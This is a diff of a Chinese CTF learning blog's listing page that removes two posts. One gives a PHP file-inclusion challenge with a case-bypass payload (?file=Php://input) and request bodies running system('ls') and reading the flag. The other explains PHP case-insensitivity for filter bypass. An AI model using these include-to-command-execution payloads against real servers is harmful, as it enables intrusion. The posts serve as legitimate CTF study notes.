-      <a data-url="http://traveler2000.github.io/2025/04/16/%E7%BB%88%E4%BA%8E%E8%BD%AE%E5%88%B0%E4%BA%86%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/" data-id="cm9wms3ls0037kcuh4du4fs1z" data-title="终于轮到了日志注入" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/16/%E7%BB%88%E4%BA%8E%E8%BD%AE%E5%88%B0%E4%BA%86%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/" data-id="cm9znqrk2002eeouhczrk4rdd" data-title="终于轮到了日志注入" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-php伪协议之input" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/" class="article-date">
-  <time class="dt-published" datetime="2025-04-15T12:17:14.055Z" itemprop="datePublished">2025-04-15</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/">PHP 伪协议之 php://input</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>此处可大写绕过与 <code>php://input</code> 相结合。</p>
-<p>URL：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=Php://input</span><br></pre></td></tr></table></figure>
-
-<p>请求体：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;ls&quot;);?&gt;//第一次请求</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;tac fla*&quot;);?&gt;//第二次请求</span><br></pre></td></tr></table></figure>
-
-<p>借此讲讲 <code>php://input</code> 怎么用。</p>
-<p><code>php://input</code> 是一个 PHP 内置的伪协议，<strong>用于读取 HTTP 请求中的原始数据</strong>。</p>
-<p>从超级全局变量 <strong><code>$_POST</code></strong> 数组读取的是处理过的、作为一个个元素的参数。当需要<strong>读取 POST 原始数据</strong>时，通常就会用到 <code>php://input</code> 伪协议来读取请求体。因为是直接读取请求体，所以 <strong>HTTP method 不是 POST 也能读取</strong>。</p>
-<p>所以，我们可以发送请求时抓包，然后修改请求体为 Payload ，并把 URL 中将要被文件包含的参数的值改为 <code>php://input</code> ，最后发包看看响应的效果。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/" data-id="cm9wms3ld000nkcuh7vvscbgb" data-title="PHP 伪协议之 php://input" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-大小写绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/04/15/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/" class="article-date">
-  <time class="dt-published" datetime="2025-04-15T10:44:35.803Z" itemprop="datePublished">2025-04-15</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">杂项知识点</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/04/15/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/">大小写绕过</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>PHP 中有许多不用考虑大小写的地方，如：</p>
-<ul>
-<li><p><strong>PHP 标签</strong><code>&lt;?php</code><br>一般情况下必须严格小写，但某些服务器配置<strong>可能支持</strong>大写如 <code>&lt;?Php</code> 这样的写法。目前做的做题能用。</p>
-</li>
-<li><p><strong>伪协议名称</strong><br><code>php://</code>、<code>data://</code>等伪协议名称可以大小写混用，但目前做的题只有<code>php://</code>不用考虑大小写，<code>data://</code>大小写混用或是全大写就无法正常文件包含。所以现在大小写混用**只考虑<code>php://</code>**。</p>
-</li>
-<li><p><strong>关键字和控制结构</strong><br>如 <code>if</code>、<code>else</code>、<code>while</code>、<code>for</code>、<code>echo</code>、<code>return</code> 等。例如，<code>IF (...) &#123;...&#125;</code> 或 <code>ECHO &quot;Hello&quot;;</code> 是合法的。</p>
-</li>
-<li><p><strong>函数名（用户定义和内置）</strong><br>用户定义的函数和PHP内置函数在调用时不区分大小写。例如：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="title function_ invoke__">myfunc</span>(); <span class="comment">// 可调用</span></span><br><span class="line"><span class="title function_ invoke__">STRTOLOWER</span>(<span class="string">&quot;ABC&quot;</span>); <span class="comment">// 等同于 strtolower()</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>类名和方法名</strong><br>用户定义的类名和方法名在引用时不区分大小写。例如：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">MYCLASS</span>(); <span class="comment">// 可实例化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">myMethod</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">MYMETHOD</span>(); <span class="comment">// 可调用</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>常量（通过 <code>define</code> 定义且启用大小写不敏感时）</strong><br>使用 <code>define(&quot;NAME&quot;, value, true)</code> 定义的常量，第三个参数为 <code>true</code> 时大小写不敏感。例如：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;GREETING&quot;</span>, <span class="string">&quot;Hello&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> greeting; <span class="comment">// 输出 &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<p><strong>对大小写敏感的部分</strong>：</p>
-<ul>
-<li>变量名（如 <code>$var</code> 和 <code>$VAR</code> 不同）。</li>
-<li>属性名和常量（默认情况下）。</li>
-<li>魔术常量（如 <code>__FILE__</code>、<code>__LINE__</code>）和魔术方法（如 <code>__construct()</code>，需严格拼写）。</li>
-<li>预定义变量（如 <code>$_GET</code>、<code>$_POST</code>）。</li>
-</ul>
-<p>可以活用于一些题，可惜知道的有点晚。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/15/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/" data-id="cm9wms3lq002skcuh3rt22fqx" data-title="大小写绕过" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">杂项知识点</a></li></ul>
 
     </footer>
   </div>
@@ -1155,7 +1186,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/">未分类</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">杂项知识点</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%88%86%E7%A0%B4/">爆破</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0/">编程笔记</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP%E7%89%B9%E6%80%A7/">PHP特性</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">命令执行与文件包含</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/">未分类</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/">杂项知识点</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%88%86%E7%A0%B4/">爆破</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0/">编程笔记</a></li></ul>
     </div>
   </div>
 
@@ -1197,6 +1228,14 @@
       <ul>
         
           <li>
+            <a href="/2025/04/27/PHP%E7%89%B9%E6%80%A7%E9%A2%98%E7%9B%AE/">PHP 特性题目</a>
+          </li>
+        
+          <li>
+            <a href="/2025/04/27/%E5%88%A9%E7%94%A8%E6%88%96%E8%BF%90%E7%AE%97%E6%B4%BB%E5%AD%97%E5%8D%B0%E5%88%B7/">利用或运算活字印刷</a>
+          </li>
+        
+          <li>
             <a href="/2025/04/25/GET%E4%B8%8EPOST%E6%95%B0%E7%BB%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/">$_GET 与 $_POST 数组相关知识</a>
           </li>
         
@@ -1206,14 +1245,6 @@
         
           <li>
             <a href="/2025/04/25/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8F%98%E4%BD%93%E9%A2%98%E7%9B%AE/">条件竞争变体题目</a>
-          </li>
-        
-          <li>
-            <a href="/2025/04/24/Python-requests/">Python-requests</a>
-          </li>
-        
-          <li>
-            <a href="/2025/04/22/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%85%A5%E9%97%A8/">Python-面向对象入门</a>
           </li>
         
       </ul>
